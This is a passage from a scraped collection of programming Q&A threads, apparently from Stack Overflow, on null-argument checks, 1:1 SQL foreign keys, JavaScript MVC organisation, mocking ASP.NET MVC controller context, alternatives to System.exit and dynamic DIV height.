        catch (SmtpFailedRecipientException ex)
        { }
        catch (SmtpException ex)
        { }
        finally
        {
            mailSender = null;
            mailMessage.Dispose();
        }
        return false;
}
</code></pre>
"
"Passing null to a method <p>I am in the middle of reading the excellent <a href=""http://rads.stackoverflow.com/amzn/click/0132350882"">Clean Code</a></p>

<p>One discussion is regarding passing nulls into a method.</p>

<pre><code>public class MetricsCalculator {
    public double xProjection(Point p1, Point p2) {
        return (p2.x - p1.x) * 1.5;
    }
}
...
calculator.xProjection(null, new Point(12,13));
</code></pre>

<p>It represents different ways of handling this:</p>

<pre><code>public double xProjection(Point p1, Point p2) {
    if (p1 == null || p2 == null) {
        throw new IllegalArgumentException(""Invalid argument for xProjection"");
    }
    return (p2.x - p1.x) * 1.5;
}

public double xProjection(Point p1, Point p2) {
    assert p1 != null : ""p1 should not be null"";
    assert p2 != null : ""p2 should not be null"";
    return (p2.x - p1.x) * 1.5;
}
</code></pre>

<p>I prefer the <a href=""http://java.sun.com/j2se/1.4.2/docs/guide/lang/assert.html"">assertions</a> approach, but I don't like the fact that assertions are turned off by default.</p>

<p>The book finally states:</p>

<blockquote>
  <p>In most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.</p>
</blockquote>

<p>It doesn't really go into how you would enforce this restriction?</p>

<p>Do any of you have strong opinions either way.</p>
 <p>I generally prefer not doing either, since it's just slowing things down. NullPointerExceptions are thrown later on anyway, which will quickly lead the user to discovering they're passing null to the method. I used to check, but 40% of my code ended up being checking code, at which point I decided it was just not worth the nice assertion messages.</p>
 <blockquote>
  <p>It doesn't really go into how you would enforce this restriction?</p>
</blockquote>

<p>You enforce it by throwing an <a href=""http://msdn.microsoft.com/en-us/library/system.argumentexception.aspx"" rel=""nofollow"">ArgumentExcexception</a> if they pass in null.</p>

<pre><code>if (p1 == null || p2 == null) {
    throw new ArgumentExcexception(""Invalid argument for xProjection"");
}
</code></pre>
 <p>I agree or disagree with wvdschel's post, it depends on what he's specifically saying.</p>

<p>In this case, sure, this method will crash on null so the explicit check here is probably not needed.</p>

<p>However, if the method simply stores the passed data, and there is some other method that you call later that will deal with it, discovering bad input as early as possible is the key to fixing bugs faster. At that later point, there could be a myriad of ways that bad data happened to be given to your class. It's sort of trying to figure out how the rats came into your house after the fact, trying to find the hole somewhere.</p>
 <p>I prefer the use of assertions. </p>

<p>I have a rule that I only use assertions in public and protected methods. This is because I believe the calling method should ensure that it is passing valid arguments to private methods.</p>
 <p>General rule is if your method doesn't expect null arguments then you should throw <a href=""http://msdn.microsoft.com/en-us/library/system.argumentnullexception.aspx"">System.ArgumentNullException</a>. Throwing proper exception not only protects you from resource corruption and other bad things but serves as a guide for users of your code saving time spent debugging your code.</p>

<p>Also read an article on <a href=""http://en.wikipedia.org/wiki/Defensive_programming"">Defensive programming</a></p>
 <p>@Chris Karcher I would say absolutely correct. The only thing I would say is check the params separately and have the exeption report the param that was null also as it makes tracking where the null is coming from much easier.</p>

<p>@wvdschel wow! If writing the code is too much effort for you, you should look into something like <a href=""http://www.postsharp.org/"" rel=""nofollow"">PostSharp</a> (or a Java equivalent if one is available) which can post-process your assemblies and insert param checks for you. </p>
 <p>@lassevk:</p>

<blockquote>
  <p>However, if the method simply stores the passed data, and there is some other method that you call later that will deal with it, discovering bad input as early as possible is the key to fixing bugs faster. At that later point, there could be a myriad of ways that bad data happened to be given to your class. It's sort of trying to figure out how the rats came into your house after the fact, trying to find the hole somewhere.</p>
</blockquote>

<p>You're right about that, these checks should only be enforced when data is only stored to be processed or used later, I didn't think of that scenario.</p>

<p>@Shaun Austin:</p>

<blockquote>
  <p>wow! If writing the code is too much effort for you, ...</p>
</blockquote>

<p>Writing code is not the problem, writing monkey code that bothers me. Writing code that a machine could have written better. That library looks like it does just that, thanks for pointing it out!</p>
 <p>Although it is not strictly related you might want to take a look to <a href=""http://research.microsoft.com/SpecSharp/"" rel=""nofollow"">Spec#</a>.</p>

<p>I think it is still in development (by Microsoft) but some CTP are available and it looks promising. Basically it allows you to do this:</p>

<pre><code>  public static int Divide(int x, int y)
    requires y != 0 otherwise ArgumentException; 
  {
  }
</code></pre>

<p>or</p>

<pre><code>  public static int Subtract(int x, int y)
    requires x &gt; y;
    ensures result &gt; y;
  {
    return x - y;
  }
</code></pre>

<p>It also provides another features like Notnull types. It's build on top of the .NET Framework 2.0 and it's fully compatible. The syntaxt, as you may see, is C#.</p>
 <p>Spec# looks very interesting!</p>

<p>When something like that isn't available, I generally test non-private methods with a run-time null-check, and assertions for internal methods.  Rather than code the null check explicitly in each method, I delegate that to a utilities class with a check null method:</p>

<pre><code>/**
 * Checks to see if an object is null, and if so 
 * generates an IllegalArgumentException with a fitting message.
 * 
 * @param o The object to check against null.
 * @param name The name of the object, used to format the exception message
 *
 * @throws IllegalArgumentException if o is null.
 */
public static void checkNull(Object o, String name) 
    throws IllegalArgumentException {
   if (null == o)
      throw new IllegalArgumentException(name + "" must not be null"");
}

public static void checkNull(Object o) throws IllegalArgumentException {
   checkNull(o, ""object"");
} 

// untested:
public static void checkNull(Object... os) throws IllegalArgumentException {
   for(Object o in os) checkNull(o);  
}
</code></pre>

<p>Then checking turns into:</p>

<pre><code>public void someFun(String val1, String val2) throws IllegalArgumentException {
   ExceptionUtilities.checkNull(val1, ""val1"");
   ExceptionUtilities.checkNull(val2, ""val2"");

   /** alternatively:
   ExceptionUtilities.checkNull(val1, val2);
   **/

   /** ... **/
}
</code></pre>

<p><em>That</em> can be added with editor macros, or a code-processing script.
<strong>Edit:</strong> The verbose check could be added this way as well, but I think it's significantly easier to automate the addition of a single line.</p>
 <p>Also not of immediate use, but related to the mention of Spec#... There's a proposal to add ""null-safe types"" to a future version of Java: <a href=""http://docs.google.com/View?docid=dfn5297z_2kjj2fk"" rel=""nofollow"">""Enhanced null handling - Null-safe types""</a>.</p>

<p>Under the proposal, your method would become</p>

<pre><code>public class MetricsCalculator {
    public double xProjection(#Point p1, #Point p2) {
        return (p2.x - p1.x) * 1.5;
    }
}
</code></pre>

<p>where <code>#Point</code> is the type of non-<code>null</code> references to objects of type <code>Point</code>.</p>
 <p>Thwrowing C# <code>ArgumentException</code>, or Java <code>IllegalArgumentException</code> right at the beginning of the method looks to me as the clearest of solutions. </p>

<p>One should always be careful with Runtime Exceptions - exceptions that are not declared on the method signature. Since the compiler doesn't enforce you to catch these it's really easy to forget about them. Make sure you have some kind of a ""catch all"" exception handling to prevent the software to halt abruptly. That's the most important part of your user experience.</p>
 <p>The best way to handle this really would be the use of exceptions. Ultimately, the asserts are going to end up giving a <em>similar</em> experience to the end user but provide no way for the developer calling your code to handle the situation before showing an exception to the end user. Ultimatley, you want to ensure that you test for invalid inputs as early as possible (especially in public facing code) and provide the appropriate exceptions that the calling code can catch.</p>
 <blockquote>
  <p>In most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.</p>
</blockquote>

<p>I found JetBrains' @Nullable and @NotNull annotations approach for dealing with this the most ingenious, so far. It's IDE specific, unfortunately, but really clean and powerful, IMO.</p>

<p><a href=""http://www.jetbrains.com/idea/documentation/howto.html"" rel=""nofollow"">http://www.jetbrains.com/idea/documentation/howto.html</a> </p>

<p>Having this (or something similar) as a java standard would be really nice.</p>
 <p>Both the use of assertions and the throwing of exceptions are valid approaches here.  Either mechanism can be used to indicate a programming error, not a runtime error, as is the case here.</p>

<ul>
<li>Assertions have the advantage of performance as they are typically disabled on production systems.  </li>
<li>Exceptions have the advantage of safety, as the check is always performed.  </li>
</ul>

<p>The choice really depends on the development practices of the project.  The project as a whole needs to decide on an assertion policy: if the choice is to enable assertions during all development, then I'd say to use assertions to check this kind of invalid parameter - in a production system, a NullPointerException thrown due to a programming error is unlikely to be able to be caught and handled in a meaningful way anyway and so will act just like an assertion.</p>

<p>Practically though, I know a lot of developers that don't trust that assertions will be enabled when appropriate and so opt for the safety of throwing a NullPointerException.</p>

<p>Of course if you can't enforce a policy for your code (if you're creating a library, for example, and so are dependent on how other developers run your code), you should opt for the safe approach of throwing NullPointerException for those methods that are part of the library's API.</p>
 <p>Slightly off-topic, but one feature of <a href=""http://findbugs.sourceforge.net/"" rel=""nofollow"">findbugs</a> that I think is very useful is to be able to annotate the parameters of methods to describe which parameters should not be passed a null value.  </p>

<p>Using static analysis of your code, findbugs can then point out locations where the method is called with a potentially null value.  </p>

<p>This has two advantages:</p>

<ol>
<li>The annotation describes your intention for how the method should be called, aiding documentation</li>
<li>FindBugs can point to potential problem callers of the method, allowing you to track down potential bugs.</li>
</ol>

<p>Only useful when you have access to the code that calls your methods ... but that is usually the case.</p>
 <p>@aku</p>

<blockquote>
  <p>then you should throw System.ArgumentNullException</p>
</blockquote>

<p>I don't see how throwing a .net framework exception is going to help him :)</p>

<p>Otherwise, in a Java way, assuming the null comes from a programming error (ie. should never go outside the testing phase), then leave the system throw it, or if there are side-effects reaching that point, check for null at the beginning and throw either IllegalArgumentException or NullPointerException.</p>

<p>If the null could come from an actual <em>exception</em>al case but you don't want to use a checked exception for that, then you definitely want to go the IllegalArgumentException route at the beginning of the method.</p>
 <p>Since off-topic seems to have become the topic, Scala takes an interesting approach to this. All types are assumed to be not null, unless you explicity wrap it in an <code>Option</code> to indicate that it might be null. So:</p>

<pre><code>//  allocate null
var name : Option[String]
name = None

//  allocate a value
name = Any[""Hello""]

//  print the value if we can
name match {
  Any[x] =&gt; print x
  _ =&gt; print ""Nothing at all""
}
</code></pre>
"
"1:1 Foreign Key Constraints <p>How do you specify that a foreign key constraint should be a 1:1 relationship in transact sql? Is declaring the column UNIQUE enough? Below is my existing code.!</p>

<pre><code>CREATE TABLE [dbo].MyTable(
    [MyTablekey] INT IDENTITY(1,1) NOT FOR REPLICATION NOT NULL,
    [OtherTableKey] INT NOT NULL UNIQUE
        CONSTRAINT [FK_MyTable_OtherTable] FOREIGN KEY REFERENCES [dbo].[OtherTable]([OtherTableKey]),
    ...
    CONSTRAINT [PK_MyTable] PRIMARY KEY CLUSTERED 
    (
        [MyTableKey] ASC
    ) WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
</code></pre>
 <p>You could declare the column to be both the primary key and a foreign key.  This is a good strategy for ""extension"" tables that are used to avoid putting nullable columns into the main table.</p>
 <p>Based on your code above, the unique constraint would be enough given that the for every primary key you have in the table, the unique constrained column is also unique.  Also, this assumes that in [OtherTable], the [OtherTableKey] column is the primary key of that table.</p>
 <p>A foreign key column with the UNIQUE and NOT NULL constraints that references a UNIQUE, NOT NULL column in another table creates a 1:(0|1) relationship, which is probably what you want.</p>

<p>If there was a true 1:1 relationship, every record in the first table would have a corresponding record in the second table and vice-versa. In that case, you would probably just want to make one table (unless you needed some strange storage optimization).</p>
 <blockquote>
  <p>If there was a true 1:1 relationship, every record in the first table would have a corresponding record in the second table and vice-versa. In that case, you would probably just want to make one table (unless you needed some strange storage optimization).</p>
</blockquote>

<p>This is very incorrect. Let me give you an example. You have a table CLIENT that has a 1:1 relationship with table SALES_OFFICE because, for example, the logic of your system says so. Would you really incorporate the data of SALES_OFFICE into CLIENT table? And if another tables need to relate them selfs with SALES_OFFICE? And what about database normalization best practices and patterns?</p>

<blockquote>
  <p>A foreign key column with the UNIQUE and NOT NULL constraints that references a UNIQUE, NOT NULL column in another table creates a 1:(0|1) relationship, which is probably what you want.</p>
</blockquote>

<p>The first part of your answer is the right answer, without the second part, unless the data in second table is really a kind of information that belongs to first table and never will be used by other tables.</p>
 <p>@bosnic:</p>

<blockquote>
  <p>You have a table CLIENT that has a 1:1 relationship with table SALES_OFFICE because, for example, the logic of your system says so. </p>
</blockquote>

<p>What your app logic says, and what your data model say are 2 different things. There is nothing wrong with enforcing that relationship with your business logic code, but it has no place in the data model.</p>

<blockquote>
  <p>Would you really incorporate the data of SALES_OFFICE into CLIENT table? </p>
</blockquote>

<p>If every CLIENT has a unique SALES_OFFICE, and every SALES_OFFICE has a singular, unique CLIENT - then yes, they should be in the same table. We just need a better name. ;)</p>

<blockquote>
  <p>And if another tables need to relate them selfs with SALES_OFFICE? </p>
</blockquote>

<p>There's no reason to. Relate your other tables to CLIENT, since CLIENT has a unique SALES_OFFICE. </p>

<blockquote>
  <p>And what about database normalization best practices and patterns?</p>
</blockquote>

<p>This <em>is</em> normalization.</p>

<p>To be fair, SALES_OFFICE and CLIENT is obviously not a 1:1 relationship - it's 1:N. Hopefully, your SALES_OFFICE exists to serve more than 1 client, and will continue to exist (for a while, at least) without any clients.</p>

<p>A more realistic example is SALES_OFFICE and ZIP_CODE. A SALES_OFFICE must have exactly 1 ZIP_CODE, and 2 SALES_OFFICEs - even if they have an equivalent ZIP_CODE - do not share the <em>instance</em> of a ZIP_CODE (so, changing the ZIP_CODE of 1 does not impact the other). Wouldn't you agree that ZIP_CODE belongs as a column in SALES_OFFICE?</p>
"
"Alternative ""architectural"" approaches to javaScript client code? <p>How is your javaScript code organized? Does it follow patterns like MVC, or something else? </p>

<p>I've been working on a side project for some time now, and the further I get, the more my webpage has turned into a full-featured application. Right now, I'm sticking with <a href=""http://jquery.com"">jQuery</a>, however, the logic on the page is growing to a point where some organization, or dare I say it, ""architecture"" is needed. My first approach is ""MVC-ish"":</p>

<ul>
<li>The 'model' is a JSON tree that gets extended with helpers</li>
<li>The view is the DOM plus classes that tweak it</li>
<li>The controller is the object where I connect events handling and kick off view or model manipulation</li>
</ul>

<p>I'm very interested, however, in how other people have built more substantial javaScript apps. I'm not interested in GWT, or other server-oriented approaches... just in the approach of ""javaScript + &lt;generic web service-y thingy here&gt;""</p>

<p>Note: earlier I said javaScript ""is not really OO, not really functional"". This, I think, distracted everyone. Let's put it this way, because javaScript is unique in many ways, and I'm coming from a strongly-typed background, I don't want to force paradigms I know but were developed in very different languages.</p>
 <p>..but Javascript has many facets that <strong>are</strong> OO.</p>

<p>Consider this:</p>

<pre><code>var Vehicle = jQuery.Class.create({ 
   init: function(name) { this.name = name; } 
});

var Car = Vehicle.extend({ 
   fillGas: function(){ 
      this.gas = 100; 
   } 
});
</code></pre>

<p>I've used this technique to create page-level javascript classes that have their own state, this helps keep it contained (and I often identify areas that I can reuse and put into other classes).</p>

<p>This is also especially useful when you have components/server controls that have their own script to execute, but when you might have multiple instances on the same page.  This keeps the state separate.</p>
 <p>Not 100% sure what you mean here, but I will say that after doing ASP.NET for the last 6 years, my web pages are now mostly driven by JavaScript once the basic page rendering is done by the server. I use JSON for everything (have been for about 3 years now) and use <a href=""http://www.mochikit.com"" rel=""nofollow""><strong>MochiKit</strong></a> for my client-side needs.</p>

<p>By the way, JavaScript <em>is</em> OO, but since it uses prototypical inheritance, people don't give it credit in that way. I would also argue that it is functional as well, it all depends on how you write it. If you are really interested in functional programming styles, check out <a href=""http://www.mochikit.com"" rel=""nofollow""><strong>MochiKit</strong></a> - you may like it; it leans quite a bit towards the functional programming side of JavaScript.</p>
 <p>MochiKit is great -- and was my first love, so-to-speak, as far as js libraries go.  But I found that while MochiKit has very expressive syntax, it didn't feel nearly as comfortable to me as Prototype/Scriptaculous or jQuery did for me.</p>

<p>I think if you know or like python, then MochiKit is a good tool for you.</p>
 <p>Thank you all kindly for your answers. After some time, I'd like to post what I've learned so far.</p>

<p>So far, I see a very large difference the approach using something like <a href=""http://extjs.com"" rel=""nofollow"">Ext</a>, and others like  <a href=""http://ui.jquery.com"" rel=""nofollow"">JQuery UI</a>, <a href=""http://script.aculo.us"" rel=""nofollow"">Scriptaculous</a>, <a href=""http://mochikit.org"" rel=""nofollow"">MochiKit</a>, etc. </p>

<p>With Ext, the HTML is just a single placeholder - UI goes here. From then on, <b>everything</b> is described in JavaScript. DOM interaction is minimized under another (perhaps stronger) API layer.</p>

<p>With the other kits, I find myself starting by doing a bit of HTML design, and then extending the DOM directly with snazzy effects, or just replacing the form input here, an addition there.</p>

<p>The major differences start to happen as I need to deal with event handling, etc. As modules need to ""talk"" to each other, I find myself needing to step away from the DOM, abstracting it away in pieces.</p>

<p>I note that many of these libraries also include some interesting modularization techniques as well. A very clear description is contributed on the Ext website, which includes <a href=""http://extjs.com/learn/Manual:Basic_Application_Design"" rel=""nofollow"">a fancy way to ""protect"" your code with modules</a>. </p>

<p>A new player I haven completely evaluated is <a href=""http://sproutcore.com"" rel=""nofollow"">Sproutcore</a>. It seems like Ext in approach, where the DOM is hidden, and you mostly want to deal with the project's API.</p>
 <p>Tristan, you will find that when you try to architecture JavaScript as an MVC application it tends to come up short in one area -- the model. The most difficult area to deal with is the model because the data does not persist throughout the application, and by nature the models seem to change on the client-side pretty consistently. You could standardize how you pass and receive data from the server, but then at that point the model does not really belong to JavaScript -- it belongs to your server-side application.</p>

<p>I did see one attempt awhile back where someone created a framework for modeling data in JavaScript, much like the way SQLite belongs to the application. It was like Model.select( ""Product"" ) and Model.update( ""Product"", ""Some data..."" ). It was basically an object notation that held a bunch of data to manage the state of the current page. However, the minute you refresh, all that data is lost. I'm probably off on the syntax, but you get the point.</p>

<p>If you are using jQuery, then Ben's approach is really the best. Extend the jQuery object with your functions and properties, and then compartmentalize your ""controllers"". I usually do this by putting them into separate source files, and loading them on a section-by-section basis. For instance, if it were an e-commerce site, I might have a JS file full of controllers that handle functionality for the checkout process. This tends to keep things lightweight and easy to manage.</p>
 <p>Just a quick clarification. </p>

<p>It is perfectly feasible to write GWT apps that are not server-oriented. I am assuming that from Server-Oriented you mean GWT RPC that needs java based back-end. </p>

<p>I have written GWT apps that are very ""MVC-ish"" on the client side alone. </p>

<ul>
<li>The model was an object graph. Although you code in Java, at runtime the objects are in javascript with no need of any JVM in either client or server-side. GWT also supports JSON with complete parsing and manipulation support. You can connect to JSON webservices easily, see [2] for a JSON mashup example. </li>
<li>View was composed of standard GWT widgets (plus some of our own composite widgets)</li>
<li>Controller layer was neatly separated from View via Observer pattern.</li>
</ul>

<p>If your ""strongly-typed"" background is with Java or similar language, I think you should seriously consider GWT for large projects. For small projects I usually prefer jQuery.  Upcoming <a href=""http://code.google.com/p/gwtquery/"" rel=""nofollow"">GWTQuery</a> that works with GWT 1.5 may change that though not in near future because of abundance of plugins for jQuery.</p>
 <p>JavaScriptMVC is a great choice for organizing and developing a large scale JS application.</p>

<p>The architecture design very well thought out.  There are 4 things you will ever do with JavaScript:</p>

<ol>
<li>Respond to an event </li>
<li>Request Data / Manipulate Services (Ajax) </li>
<li>Add domain specific information to the ajax response. </li>
<li>Update the DOM</li>
</ol>

<p>JMVC splits these into the Model, View, Controller pattern.</p>

<p>First, and probably the most important advantage, is the Controller.  Controllers use event delegation, so instead of attaching events, you simply create rules for your page.  They also use the name of the Controller to limit the scope of what the controller works on.  This makes your code deterministic, meaning if you see an event happen in a '#todos' element you know there has to be a todos controller.</p>

<pre><code>$.Controller.extend('TodosController',{
   'click' : function(el, ev){ ... },
   '.delete mouseover': function(el, ev){ ...}
   '.drag draginit' : function(el, ev, drag){ ...}
})
</code></pre>

<p>Next comes the model.  JMVC provides a powerful Class and basic model that lets you quickly organize Ajax functionality (#2) and wrap the data with domain specific functionality (#3).  When complete, you can use models from your controller like:</p>

<p>Todo.findAll({after: new Date()}, myCallbackFunction);</p>

<p>Finally, once your todos come back, you have to display them (#4).  This is where you use JMVC's view.  </p>

<pre><code>'.show click' : function(el, ev){ 
   Todo.findAll({after: new Date()}, this.callback('list'));
},
list : function(todos){
   $('#todos').html( this.view(todos));
}
</code></pre>

<p>In 'views/todos/list.ejs'</p>

<pre><code>&lt;% for(var i =0; i &lt; this.length; i++){ %&gt;
   &lt;label&gt;&lt;%= this[i].description %&gt;&lt;/label&gt;
&lt;%}%&gt;
</code></pre>

<p>JMVC provides a lot more than architecture.  It helps you in ever part of the development cycle with:</p>

<ul>
<li>Code generators</li>
<li>Integrated Browser, Selenium, and Rhino Testing</li>
<li>Documentation</li>
<li>Script compression</li>
<li>Error reporting</li>
</ul>
"
"Mocking Asp.net-mvc Controller Context <p>So the controller context depends on some asp.net internals. What are some ways to cleanly mock these up for unit tests? Seems like its very easy to clog up tests with tons of setup when I only need, for example, Request.HttpMethod to return ""GET"".</p>

<p>I've seen some examples/helpers out on the nets, but some are dated. Figured this would be a good place to keep the latest and greatest.</p>

<p>I'm using latest version of rhino mocks</p>
 <p>Using MoQ it looks something like this:</p>

<pre><code>var request = new Mock&lt;HttpRequestBase&gt;();
request.Expect(r =&gt; r.HttpMethod).Returns(""GET"");
var mockHttpContext = new Mock&lt;HttpContextBase&gt;();
mockHttpContext.Expect(c =&gt; c.Request).Returns(request.Object);
var controllerContext = new ControllerContext(mockHttpContext.Object
, new RouteData(), new Mock&lt;ControllerBase&gt;().Object);
</code></pre>

<p>I think the Rhino Mocks syntax is similar.</p>
 <p>I find that long mocking procedure to be too much friction.</p>

<p>The best way we have found - using ASP.NET MVC on a real project - is to abstract the HttpContext to an IWebContext interface that simply passes through. Then you can mock the IWebContext with no pain.</p>

<p>Here is an <a href=""http://code.google.com/p/tarantino/source/browse/trunk/src/Tarantino.Core/Commons/Services/Web/IWebContext.cs"" rel=""nofollow"">example</a></p>
 <p>Here's a snippet from Jason's link. Its the same as Phil's method but uses rhino. </p>

<p><em>Note: mockHttpContext.Request is stubbed to return mockRequest <strong>before</strong> mockRequest's internals are stubbed out. I believe this order is required.</em></p>

<pre><code>// create a fake web context
var mockHttpContext = MockRepository.GenerateMock&lt;HttpContextBase&gt;();
var mockRequest = MockRepository.GenerateMock&lt;HttpRequestBase&gt;();
mockHttpContext.Stub(x =&gt; x.Request).Return(mockRequest);

// tell the mock to return ""GET"" when HttpMethod is called
mockRequest.Stub(x =&gt; x.HttpMethod).Return(""GET"");            

var controller = new AccountController();

// assign the fake context
var context = new ControllerContext(mockHttpContext, 
                  new RouteData(), 
                  controller);
controller.ControllerContext = context;

// act
...
</code></pre>
 <p>i've finished with this spec</p>

<pre><code>public abstract class Specification &lt;C&gt; where C: Controller
{
    protected C controller;

    HttpContextBase mockHttpContext;
    HttpRequestBase mockRequest;

    protected Exception ExceptionThrown { get; private set; }

    [SetUp]
    public void Setup()
    {
        mockHttpContext = MockRepository.GenerateMock&lt;HttpContextBase&gt;();
        mockRequest = MockRepository.GenerateMock&lt;HttpRequestBase&gt;();

        mockHttpContext.Stub(x =&gt; x.Request).Return(mockRequest);
        mockRequest.Stub(x =&gt; x.HttpMethod).Return(""GET"");


        EstablishContext();
        SetHttpContext();

        try
        {
            When();
        }
        catch (Exception exc)
        {
            ExceptionThrown = exc;
        }
    }

    protected void SetHttpContext()
    {
        var context = new ControllerContext(mockHttpContext, new RouteData(), controller);
        controller.ControllerContext = context;
    }

    protected T Mock&lt;T&gt;() where T: class
    {
        return MockRepository.GenerateMock&lt;T&gt;();
    }

    protected abstract void EstablishContext();
    protected abstract void When();

    [TearDown]
    public virtual void TearDown()
    {
    }
} 
</code></pre>

<p>and the juice is here </p>

<pre><code>[TestFixture]
public class When_invoking_ManageUsersControllers_Update :Specification   &lt;ManageUsersController&gt;
{
    private IUserRepository userRepository;
    FormCollection form;

    ActionResult result;
    User retUser;

    protected override void EstablishContext()
    {
        userRepository = Mock&lt;IUserRepository&gt;();
        controller = new ManageUsersController(userRepository);

        retUser = new User();
        userRepository.Expect(x =&gt; x.GetById(5)).Return(retUser);
        userRepository.Expect(x =&gt; x.Update(retUser));

        form = new FormCollection();
        form[""IdUser""] = 5.ToString();
        form[""Name""] = 5.ToString();
        form[""Surename""] = 5.ToString();
        form[""Login""] = 5.ToString();
        form[""Password""] = 5.ToString();
    }

    protected override void When()
    {
        result = controller.Edit(5, form);
    }

    [Test]
    public void is_retrieved_before_update_original_user()
    {
        userRepository.AssertWasCalled(x =&gt; x.GetById(5));
        userRepository.AssertWasCalled(x =&gt; x.Update(retUser));
    }
}
</code></pre>

<p>enjoy</p>
 <p>Or you can do this with Typemock Isolator with no need to send in a fake controller at all:</p>

<pre><code>Isolate.WhenCalled(()=&gt;HttpContext.Request.HttpMethod).WillReturn(""Get"");
</code></pre>
 <p>The procedure for this seems to have changed slightly in MVC2 (I'm using RC1). Phil Haack's solution doesn't work for me if the action requires a specific method (<code>[HttpPost]</code>, <code>[HttpGet]</code>). Spelunking around in Reflector, it looks like the method for verifying these attributes has changed. MVC now checks <code>request.Headers</code>, <code>request.Form</code>, and <code>request.QueryString</code> for a <code>X-HTTP-Method-Override</code> value.</p>

<p>If you add mocks for these properties, it works:</p>

<pre><code>var request = new Mock&lt;HttpRequestBase&gt;();
request.Setup(r =&gt; r.HttpMethod).Returns(""POST"");
request.Setup(r =&gt; r.Headers).Returns(new NameValueCollection());
request.Setup(r =&gt; r.Form).Returns(new NameValueCollection());
request.Setup(r =&gt; r.QueryString).Returns(new NameValueCollection());

var mockHttpContext = new Mock&lt;HttpContextBase&gt;();
mockHttpContext.Expect(c =&gt; c.Request).Returns(request.Object);
var controllerContext = new ControllerContext(mockHttpContext.Object, new RouteData(), new Mock&lt;ControllerBase&gt;().Object);
</code></pre>
 <p>Here is a sample unit test class using MsTest and Moq which mocks HttpRequest and HttpResponse objects. (.NET 4.0, ASP.NET MVC 3.0 )</p>

<p>Controller action get value from request and sets http header in response objects. Other http context objects could be mocked up in similar way</p>

<pre><code>[TestClass]
public class MyControllerTest
{
    protected Mock&lt;HttpContextBase&gt; HttpContextBaseMock;
    protected Mock&lt;HttpRequestBase&gt; HttpRequestMock;
    protected Mock&lt;HttpResponseBase&gt; HttpResponseMock;

    [TestInitialize]
    public void TestInitialize()
    {
        HttpContextBaseMock = new Mock&lt;HttpContextBase&gt;();
        HttpRequestMock = new Mock&lt;HttpRequestBase&gt;();
        HttpResponseMock = new Mock&lt;HttpResponseBase&gt;();
        HttpContextBaseMock.SetupGet(x =&gt; x.Request).Returns(HttpRequestMock.Object);
        HttpContextBaseMock.SetupGet(x =&gt; x.Response).Returns(HttpResponseMock.Object);
    }

    protected MyController SetupController()
    {
        var routes = new RouteCollection();
        var controller = new MyController();
        controller.ControllerContext = new ControllerContext(HttpContextBaseMock.Object, new RouteData(), controller);
        controller.Url = new UrlHelper(new RequestContext(HttpContextBaseMock.Object, new RouteData()), routes);
        return controller;
    }

    [TestMethod]
    public void IndexTest()
    {
        HttpRequestMock.Setup(x =&gt; x[""x""]).Returns(""1"");
        HttpResponseMock.Setup(x =&gt; x.AddHeader(""name"", ""value""));

        var controller = SetupController();
        var result = controller.Index();
        Assert.AreEqual(""1"", result.Content);

        HttpRequestMock.VerifyAll();
        HttpResponseMock.VerifyAll();
    }
}

public class MyController : Controller
{
    public ContentResult Index()
    {
        var x = Request[""x""];
        Response.AddHeader(""name"", ""value"");
        return Content(x);
    }
}
</code></pre>
"
"Alternatives to System.exit(1) <p>For various reasons calling <code>System.exit</code> is frowned upon when writing <strong>Java Applications</strong>, so how can I notify the calling process that not everything is going according to plan?</p>

<p><strong>Edit:</strong> The 1 is a <code>standin</code> for any non-zero exit code.</p>
 <p>It's frowned upon for <em>normal</em> exits.  If ""not everything is going according to plan"", then System.exit is fine.</p>

<p>Update:  I should add that I assume your '1' has meaning that is documented somewhere.</p>
 <p>It can be dangerous / problematic in web servlet environments also. </p>

<p>Throwing an Exception is generally considered the other alternative.</p>
 <p>Our company's policy is that it's OK (even preferred) to call System.exit(-1), but only in init() methods.  I would definitely think twice before calling it during a program's normal flow.</p>
 <p>Throwing exceptions is the best way to send information about a certain error up and out of the app.</p>

<p>A number doesn't tell you as much as:</p>

<pre><code>Exception at thread 'main': FileNotFoundException ""The file 'foo' doesn't exist""
</code></pre>

<p>(or something close to that)</p>
 <p>I agree with the ""<em>throw an Exception</em>"" crowd. One reason is that calling System.exit makes your code difficult to use if you want other code to be able to use it. For example, if you find out that your class would be useful from a web app, or some kind of message consuming app, it would be nice to allow those containers the opportunity to deal with the failure somehow. A container may want to retry the operation, decide to log and ignore the problem, send an email to an administrator, etc.</p>

<p>An exception to this would be your <code>main()</code> method; this could trap the Exception, and call <code>System.exit()</code> with some value that can be recognized by the calling process or shell script.</p>
 <p>The use of System.exit is frowned upon when the 'application' is really a sub-application (e.g. servlet, applet) of a larger Java application (server): in this case the System.exit could stop the JVM and hence also all other sub-applications. In this situation, throwing an appropriate exception, which could be caught and handled by the application framework/server is the best option.</p>

<p>If the java application is really meant to be run as a standalone application, there is nothing wrong with using System.exit. in this case, setting an exit value is probably the easiest (and also most used) way of communicating failure or success to the parent process.</p>
 <p>I think throwing an exception is what you should do when something goes wrong. This way, if your application is not running as a stand-alone app the caller can react to it and has some information about what went wrong. It is also easier for debugging purposes because you as well get a better idea about what went wrong when you see a stack trace.</p>

<p>One important thing to note is that when the exception reaches the top level and therefore causes the VM to quit the VM returns a return code of 1, therefore outside applications that use the return code see that something went wrong.</p>

<p>The only case where I think System.exit() makes sense is when your app is meant to be called by applications which are not Java and therefore have to use return codes to see if your app worked or not and you want those applications to have a chance to react differently on different things going wrong, i.e. you need different return codes.</p>
 <p><code>System.exit()</code> will block, and create a deadlock if the thread that initiated it is used in a shutdown hook.</p>
"
"Setting the height of a DIV dynamically <p>In a web application, I have a page that contains a DIV that has an auto-width depending on the width of the browser window.</p>

<p>I need an auto-height for the object.  The DIV starts about 300px from the top screen, and it's height should make it stretch to the bottom of the browser screen.  I have a max height for the container DIV, so there would have to be minimum-height for the div.  I believe I can just restrict that in CSS, and use Javascript to handle the resizing of the DIV.</p>

<p>My javascript isn't nearly as good as it should be.  Is there an easy script I could write that would do this for me?</p>

<p>Edit: 
The DIV houses a control that does it's own overflow handling (implements its own scroll bar).</p>
 <p>What should happen in the case of overflow?  If you want it to just get to the bottom of the window, use absolute positioning:</p>

